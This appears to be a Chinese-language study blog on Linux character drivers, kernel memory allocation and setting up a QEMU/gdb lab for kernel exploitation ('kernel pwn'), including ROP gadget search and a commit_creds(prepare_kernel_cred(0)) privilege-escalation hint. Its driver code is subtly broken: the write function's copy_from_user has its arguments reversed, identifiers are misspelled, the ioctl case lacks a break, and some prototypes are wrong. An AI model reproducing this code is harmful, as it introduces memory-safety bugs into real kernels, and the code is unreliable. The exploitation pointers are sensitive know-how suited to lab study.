if(copy_to_user(buf, dev-&gt;mem + p,count))&#123;</span><br><span class="line">		ret = -EFAULT;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		*ppos += count;</span><br><span class="line">		ret = count;</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">		printk(KERN_INFO &quot;read %u byte(s) from %lu\n&quot;,count ,p);</span><br><span class="line">	&#125;</span><br><span class="line">	//ppos是相对文件开头的偏移，当大于GLOBALMEM_SIZE式返回0(EOF)</span><br><span class="line">	return ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="globalmem设备驱动的写函数"><a href="#globalmem设备驱动的写函数" class="headerlink" title="globalmem设备驱动的写函数"></a>globalmem设备驱动的写函数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">static ssize_t globalmem_write(struct file filp, char __suer * buf,size_t size, loff_t *ppos)</span><br><span class="line">&#123;</span><br><span class="line">	unsigned long p = *ppos;</span><br><span class="line">	unsigned int count = size;</span><br><span class="line">	int ret = 0;</span><br><span class="line">	struct globalmem_dev *dev = filp-&gt;private_data;</span><br><span class="line">	</span><br><span class="line">	if(p &gt;= GLOBALMEM_SIZE)</span><br><span class="line">		return 0;</span><br><span class="line">	if(count &gt; GLOBANMEM_SIZE - p)</span><br><span class="line">		count = GLOBALMEM_SIZE - p;</span><br><span class="line">		</span><br><span class="line">	if(copy_from_user(buf, dev-&gt;mem + p,count))&#123;</span><br><span class="line">		ret = -EFAULT;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		*ppos += count;</span><br><span class="line">		ret = count;</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">		printk(KERN_INFO &quot;writeten %u byte(s) from %lu\n&quot;,count ,p);</span><br><span class="line">	&#125;</span><br><span class="line">	//ppos是相对文件开头的偏移，当大于GLOBALMEM_SIZE式返回0(EOF)</span><br><span class="line">	return ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="globalmem设备驱动的IO控制函数"><a href="#globalmem设备驱动的IO控制函数" class="headerlink" title="globalmem设备驱动的IO控制函数"></a>globalmem设备驱动的IO控制函数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">static long globalmem_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)</span><br><span class="line">&#123;</span><br><span class="line">	struct globalmem_dev *dev = filp-&gt;private——data;</span><br><span class="line">	switch(cmd)&#123;</span><br><span class="line">	</span><br><span class="line">	case MEM_CLEAR:</span><br><span class="line">	memset(dev-&gt;mem, 0, GLOBALMEM_SIZE);</span><br><span class="line">	printk(KERN_INFO &quot;globalmem is set to zero\n&quot;);</span><br><span class="line">	</span><br><span class="line">	default:</span><br><span class="line">		return -EINVAL;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>…</p>
<h3 id="ioctl-函数"><a href="#ioctl-函数" class="headerlink" title="ioctl()函数"></a>ioctl()函数</h3><p>…</p>
<h4 id="字符设备驱动模块加载与卸载模板函数"><a href="#字符设备驱动模块加载与卸载模板函数" class="headerlink" title="字符设备驱动模块加载与卸载模板函数"></a>字符设备驱动模块加载与卸载模板函数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">//设备结构体</span><br><span class="line">struct xxx_dev_t &#123;</span><br><span class="line">	struct cdev cdev;</span><br><span class="line">	...</span><br><span class="line">&#125; xxx_dev;</span><br><span class="line"></span><br><span class="line">//设备驱动模块加载函数</span><br><span class="line">static int __init xxx_init(void)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">	cdev_init(&amp;xxx_dev.cdev, &amp;xxx_fops);//初始化cdev</span><br><span class="line">	xxx_dev.cdev.owner = THIS_MODULE;</span><br><span class="line">    </span><br><span class="line">   if(xxx_major)&#123;</span><br><span class="line">   		register_chrdev_region(xxx_dev_no, 1, DEV_NAME);</span><br><span class="line">   	</span><br><span class="line">   &#125;else &#123;</span><br><span class="line">   		alloc_chrdev_region(&amp;xxx_dev_no, 0 ,DEV_NAME);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   ret = cdev_add(&amp;xxx_dev.cdev,xxx_dev_no, 1);//注册设备</span><br><span class="line">   ...</span><br><span class="line">   </span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> //设备驱动模块卸载函数</span><br><span class="line"> static void __exit xxx_exit(void)</span><br><span class="line"> &#123;</span><br><span class="line"> 		unregister_chrdev_region(xxx_dev_no, 1)//释放占用的设备号</span><br><span class="line"> 		cdev_del(&amp;xxx_dev.cdev);//注销设备</span><br><span class="line"> 		...</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>



<h2 id="Linux内核内存管理内核空间的动态内存申请"><a href="#Linux内核内存管理内核空间的动态内存申请" class="headerlink" title="Linux内核内存管理内核空间的动态内存申请"></a>Linux内核内存管理内核空间的动态内存申请</h2><p><code>kmalloc()</code><br><code>__get_free_page()</code><br><code>vmalloc()</code></p>
<p><code>kmalloc（）</code>和<code>__get_free_page</code>及类似函数申请的内存位于DMA和常规区域的映射区，在物理上也是连续的，他们与真实的物理地址只有一个固定的偏移，有比较简单的转换关系<code>vmalloc()</code>在虚拟内存空间给出一块连续的内存区，实质上，这片连续的内存区在物理上并不一样连续，也就没有简单的转换关系</p>
<p>kmalloc函数原型</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void *kmalloc(size_t, int flags);</span><br></pre></td></tr></table></figure>

<p>常用的分配标志是GFP_KERNEL,其含义是在内存空间的进程中申请内存。<code>kmalloc()</code>的底层依赖于<code>__get_free_page()</code>.<code>GFP</code>是这个底层函数的缩写。使用<code>GFP_KERNEL</code>标志申请内存时，若暂时不能满足，进程会睡眠等待页，即会引起阻塞，因此不能在中断上下文或者持有自旋锁的时候使用<code>GFP_KERNEL</code>申请内存。</p>
<p>其他的一些标志<code>GFP_ATOMIC</code>，<code>GFP_USER</code>,<code>GFP_HIGHUSER</code>,<code>GFP_DMA</code>,等等。</p>
<p>使用<code>kfree()</code>释放空间</p>
<p><code>__get_free_pages()</code>系列函数&#x2F;宏是Linux内核最底层用于获取空闲内存的方法，底层的buddy算法以$2^{<em>}$页为单位管理空闲内存，所以内存申请也是以$2^{</em>}$为单位</p>
<p>其系列函数&#x2F;宏包括</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get_zerod_page(unsigned int flags)//返回指向新页的指针并将该页清零</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__get_free_page(unsigned int flags);//返回新页但不清零</span><br></pre></td></tr></table></figure>
<p>实际上是调用<code>__get_free_pages()</code>申请了一页</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define __get_free_page(gfp_mask)  \</span><br><span class="line">		__get_free_pages((gfp_mask),0)</span><br></pre></td></tr></table></figure>

<p>其函数原型</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__get_free_page(unsigned int flag, unsigned int order);</span><br></pre></td></tr></table></figure>



<p><code>__get_fee_page()</code>和<code>__get_zerod_page()</code>在实现中调用了<code>alloc_pages()</code>函数，<code>alloc_page()</code>函数既可以在内核空间中分配，也可以在用户空间分配，其原型：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">struct page &amp;alloc_page(int gfp_mask, unsigned long order);//参数于__get_free_page()类似，不过返回的是页描述符，不是首地址(指针)</span><br></pre></td></tr></table></figure>



<p>使用<code>__get_free_pages()</code>系列函数使用下列函数释放内存,在使用时相应的编制位和<code>kmalloc()</code>完全一致</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">void free_page(unsigned long addr);</span><br><span class="line">void free_pages(unsigned long addr, unsigned long order);</span><br></pre></td></tr></table></figure>



<p>vmlloc()</p>
<p>vmlloc()只存在于软件中，没有硬件意义的较大的顺序缓冲区分配内存，<code>vmalloc()</code>远大于<code>__get_fee_page()</code>的开销，为了完成<code>vmalloc()</code>新的页表需要被建立。因此，调用<code>vmalloc()</code>一般适用于申请大内存(大于1页)，相应的释放函数用<code>vfree()</code></p>
<p>函数原型：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">void *vmalloc(unsigned long size);</span><br><span class="line">void vfree(void *addr);</span><br></pre></td></tr></table></figure>

<p>vmalloc不支持原子操作，它的底层实现kmalloc</p>
<h3 id="slab分配器与内存池"><a href="#slab分配器与内存池" class="headerlink" title="slab分配器与内存池"></a>slab分配器与内存池</h3><p>背景：</p>
<ul>
<li>完全使用<em>页</em>申请和释放内存容易导致浪费</li>
<li>操作系统的运行过程中，经常涉及大量对象的重复生成，使用和释放内存问题(如inode,task_struct),如果使用合适的方法使得对象前后被分配在同一块内存或同一类内存空间且保留了基本的数据结构，可以提升效率</li>
</ul>
<p>slab就是建立在buddy算法上的，他从buddy算法拿到$2^{*}$页面后进行二次管理，这一点和用户空间的C库很像，slab申请的内存以及基于slab的<code>kmalloc()</code>申请的内存，与物理内存之间也是一个简单的线性偏移</p>
<h3 id="创建slab缓存"><a href="#创建slab缓存" class="headerlink" title="创建slab缓存"></a>创建slab缓存</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struct kmem_cache *kmem_cache_create(const char *name, size_t size</span><br><span class="line">		size_t align, unsigned long flags,</span><br><span class="line">		void (*ctor)(void*, struct kmem_cache *, unsigned long),</span><br><span class="line">		void (*dtor)(void*, struct kmem_cache *, unsigned long));</span><br></pre></td></tr></table></figure>

<p><code>kmem_cache_create()</code>用于创建一个slab缓存，它是一个可以保留任意数目且<em><strong>全部同样大小</strong></em>的后被缓存。参数size是要分配的每个数据结构的大小，参数flags是控制如何进行分配的位掩码，包括<code>SLAB_HWCHACHE_ALIGN</code>（每一个数据对象被对齐到一个缓存行）<br><code>SLAB_CACHE_DMA</code>（要求数据对象在DMA区域中分配）等</p>
<h4 id="分配slab缓存"><a href="#分配slab缓存" class="headerlink" title="分配slab缓存"></a>分配slab缓存</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void *kmem_cache_alloc(struct kmem_cache *cachep, gfp_t flags);</span><br></pre></td></tr></table></figure>

<p>上述函数在<code>kmem_cache_create()</code>创建的slab后备缓存中分配一块并返回首地址指针</p>
<h3 id="释放slab缓存"><a href="#释放slab缓存" class="headerlink" title="释放slab缓存"></a>释放slab缓存</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void kmem_cache_free(struct kmem_cache *cachep, void *objp);</span><br></pre></td></tr></table></figure>

<h3 id="回收slab缓存"><a href="#回收slab缓存" class="headerlink" title="回收slab缓存"></a>回收slab缓存</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int kmem_cache_destory(struct kmem_cache *cachep);</span><br></pre></td></tr></table></figure>

<h3 id="slab缓存使用范例"><a href="#slab缓存使用范例" class="headerlink" title="slab缓存使用范例"></a>slab缓存使用范例</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建slab缓存</span></span><br><span class="line"><span class="type">static</span> <span class="type">kmem_cache_t</span> *xxx_cachep;</span><br><span class="line">xxx_cachep = kmem_cache_create(<span class="string">&quot;xxx&quot;</span>,<span class="keyword">sizeof</span>(<span class="keyword">struct</span> xxx),<span class="number">0</span>,SLAB_HWCACHE_ALIGN|SLAB_PANIC,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//分配slab缓存</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xxx</span> *<span class="title">ctx</span>;</span></span><br><span class="line">ctx = kmem_cache_alloc(xxx_cachep,GFP_KERNEL);</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用slab缓存</span></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment">//释放slab缓存</span></span><br><span class="line">kmem_cache_free(xxx_cachep, ctx);</span><br><span class="line"></span><br><span class="line">kmem_cache_destory(xxx_cachep); <span class="comment">//销毁cache</span></span><br></pre></td></tr></table></figure>

<p>注意：slab的底层依然是<code>__get_free_pages()</code>,他只是对内存进行管理，对标glibc下的ptmalloc</p>
<h1 id="kernel-pwn环境搭建"><a href="#kernel-pwn环境搭建" class="headerlink" title="kernel_pwn环境搭建"></a>kernel_pwn环境搭建</h1><p>我们学习kernel，一般不直接拿自己电脑。能上虚拟机肯定是上虚拟机。</p>
<p>我们使用qume作为运行内核的的虚拟机</p>
<ul>
<li>下载源码</li>
<li>编译内核</li>
</ul>
<h2 id="调试方法："><a href="#调试方法：" class="headerlink" title="调试方法："></a>调试方法：</h2><p>由于它是内核态，所以，为了调试方便通常我们都是运行内核时给自己加上root权限。这是前提</p>
<h3 id="获取vmlinux"><a href="#获取vmlinux" class="headerlink" title="获取vmlinux"></a>获取vmlinux</h3><p>vmlinux，静态链接的 Linux kernel，是未压缩的内核，载入可以用于gdb的调试。</p>
<p>那么，怎么获取呢？</p>
<p>一般是可以从给定bzImage中提取的。</p>
<p>脚本</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">SPDX-License-Identifier: GPL-2.0-only</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">----------------------------------------------------------------------</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">extract-vmlinux - Extract uncompressed vmlinux from a kernel image</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Inspired from extract-ikconfig</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">(c) 2009,2010 Dick Streefland &lt;dick@streefland.net&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># (c) 2011      Corentin Chary &lt;corentin.chary@gmail.com&gt;</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># ----------------------------------------------------------------------</span></span></span><br><span class="line"></span><br><span class="line">check_vmlinux()</span><br><span class="line">&#123;</span><br><span class="line">    # Use readelf to check if it&#x27;s a valid ELF</span><br><span class="line">    # TODO: find a better to way to check that it&#x27;s really vmlinux</span><br><span class="line">    #       and not just an elf</span><br><span class="line">    readelf -h $1 &gt; /dev/null 2&gt;&amp;1 || return 1</span><br><span class="line"></span><br><span class="line">    cat $1</span><br><span class="line">    exit 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">try_decompress()</span><br><span class="line">&#123;</span><br><span class="line">    # The obscure use of the &quot;tr&quot; filter is to work around older versions of</span><br><span class="line">    # &quot;grep&quot; that report the byte offset of the line instead of the pattern.</span><br><span class="line"></span><br><span class="line">    # Try to find the header ($1) and decompress from here</span><br><span class="line">    for pos in `tr &quot;$1\n$2&quot; &quot;\n$2=&quot; &lt; &quot;$img&quot; | grep -abo &quot;^$2&quot;`</span><br><span class="line">    do</span><br><span class="line">        pos=$&#123;pos%%:*&#125;</span><br><span class="line">        tail -c+$pos &quot;$img&quot; | $3 &gt; $tmp 2&gt; /dev/null</span><br><span class="line">        check_vmlinux $tmp</span><br><span class="line">    done</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Check invocation:</span></span><br><span class="line">me=$&#123;0##*/&#125;</span><br><span class="line">img=$1</span><br><span class="line">if  [ $# -ne 1 -o ! -s &quot;$img&quot; ]</span><br><span class="line">then</span><br><span class="line">    echo &quot;Usage: $me &lt;kernel-image&gt;&quot; &gt;&amp;2</span><br><span class="line">    exit 2</span><br><span class="line">fi</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Prepare temp files:</span></span><br><span class="line">tmp=$(mktemp /tmp/vmlinux-XXX)</span><br><span class="line">trap &quot;rm -f $tmp&quot; 0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">That didn<span class="string">&#x27;t work, so retry after decompression.</span></span></span><br><span class="line">try_decompress &#x27;\037\213\010&#x27; xy    gunzip</span><br><span class="line">try_decompress &#x27;\3757zXZ\000&#x27; abcde unxz</span><br><span class="line">try_decompress &#x27;BZh&#x27;          xy    bunzip2</span><br><span class="line">try_decompress &#x27;\135\0\0\0&#x27;   xxx   unlzma</span><br><span class="line">try_decompress &#x27;\211\114\132&#x27; xy    &#x27;lzop -d&#x27;</span><br><span class="line">try_decompress &#x27;\002!L\030&#x27;   xxx   &#x27;lz4 -d&#x27;</span><br><span class="line">try_decompress &#x27;(\265/\375&#x27;   xxx   unzstd</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Finally check for uncompressed images or objects:</span></span></span><br><span class="line">check_vmlinux $img</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Bail out:</span></span></span><br><span class="line">echo &quot;$me: Cannot find vmlinux.&quot; &gt;&amp;2</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>自己创建一个软连接，方便使用</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$  vml bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure>

<h3 id="gdb使用"><a href="#gdb使用" class="headerlink" title="gdb使用"></a>gdb使用</h3><p>在qemu的启动配置中，我们可以加上<code>-s</code> 参数(等效于<code>-gdb tcp::1234</code>),开启tcp监听端口，这样我们就可以在本机另开一个端口进行调试。</p>
<p><code>gdb -q -ex &quot;target remote localhost:1234&quot;</code></p>
<p>这个1234端口是<code>-s</code>默认的端口。</p>
<p>同时，我们可以在gdb中使用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add-symbol-file vmlinux addr_of_vmlinux </span><br><span class="line">add-symbol-file ./your_module.ko addr_of_ko</span><br></pre></td></tr></table></figure>

<p>来添加符号信息。</p>
<h3 id="获取驱动加载的基地址"><a href="#获取驱动加载的基地址" class="headerlink" title="获取驱动加载的基地址"></a>获取驱动加载的基地址</h3><p>这就是为什么，我们要在调试的给自己加上root权限了</p>
<p>在linux一切皆文件的思想下，我们的运行的进程等也可以通过文件查询，但是有的信息需要root权限才能看。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># method 1</span><br><span class="line">grep target_module_name /proc/modules </span><br><span class="line"></span><br><span class="line"># method 2</span><br><span class="line">cat /sys/module/target_module_name/sections/.text </span><br></pre></td></tr></table></figure>

<p>在qemu中输入<code>lsmod</code>查看驱动的基地址</p>
<p>这样我们就能看到驱动加载的基地址了，gdb调试的时候需要用到</p>
<p>试样</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">start.sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 128M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet nokaslr&quot; \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic  \</span><br><span class="line">-gdb tcp::2222 //这里用来调试，调试的时候先gdb ./vmlinux -q,进入之后add-symbols-file 漏洞文件 程序基地址（lsmod）</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p>找gadget可以用ROPgadget或者是ropper</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ROPgadget --binary ./vmlinux &gt; gadget.txt</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ropper --file ./vmlinuz --nocolor &gt; gadget2.txt</span></span><br></pre></td></tr></table></figure>



<p>调试用init文件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">挂在指令</span></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在kernle中我们一般使用commit_creds(prepare_kernel_cred(0))来提权</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">这个相当于用户态的system(<span class="string">&quot;sh&quot;</span>)</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在proc/kallsyms存放着我们需要的函数，因此可以直接在窗口用</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">cat</span> /proc/kallsyms |grep commit_cred来寻找函数地址</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">可以使用lsmod来显示程序基地址</span></span><br><span class="line">cat /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2 </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">这里加载了一个驱动一般是需要pwn 的文件</span></span><br><span class="line">insmod /core.ko</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">poweroff -d 120 -f &amp; <span class="comment">#注释掉</span></span></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh #这里把1换成0可以再我们调试的时候直接root权限即</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">setsid /bin/cttyhack setuidgid 0000 /bin/sh</span></span><br><span class="line">echo &#x27;sh end!\n&#x27;</span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>



<h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><p>程序在内核态和用户态的反复跳转根本上还是CPU(更准确地说的是寄存器)在用户地址和内核地址的反复跳转执行</p>
<p>这之间需要一个操作将每次跳转前的信息保存下来</p>
<p>​		使用内存栈或(寄存器)保存信息</p>
<h1 id="简单驱动的编写"><a href="#简单驱动的编写" class="headerlink" title="简单驱动的编写"></a>简单驱动的编写</h1><p>会涉及三个<code>linux/init.h</code>,<code>linux/module.h</code>,<code>linux/kernel.h</code>这三个linux库</p>
<p>可能还是需要重新复习以下<code>Makefile</code>的编写<a target="_blank" rel="noopener" href="https://blog.csdn.net/u012142460/article/details/78839997">内核makefile入门</a></p>
<p>大概的过程：</p>
<ul>
<li><p>先分配一个驱动号</p>
<p>  <code>int alloc_chrdev_region(dev_t *dev, unsigned baseminor, unsigned count,     const char *name)</code></p>
</li>
<li><p>注册字符设备(初始化一个驱动所需要的cdev结构体,并绑定设备号)</p>
<p>  <code>cdev_init(&amp;cdev_0, &amp;fops);</code></p>
</li>
<li><p>驱动上线</p>
<p>  <code>int cdev_add(struct cdev *p, dev_t dev, unsigned count)</code></p>
</li>
<li><p>将驱动设备注册进sysfs(文件系统)</p>
<p><code>class_create</code> 和 <code>device_create</code></p>
</li>
</ul>
<p>框架</p>
<p>int ioctl(int fd,unsigned long request,….)</p>
<p>ioctl如果简单理解的话，就是给用户和驱动程序传递消息的函数，由用户程序调用<code>fd</code>代表的是打开驱动的文件描述符，request是对驱动提出的相应请求，<code>fd</code>是打开文件时返回的，request是驱动函数编写时确定的。</p>
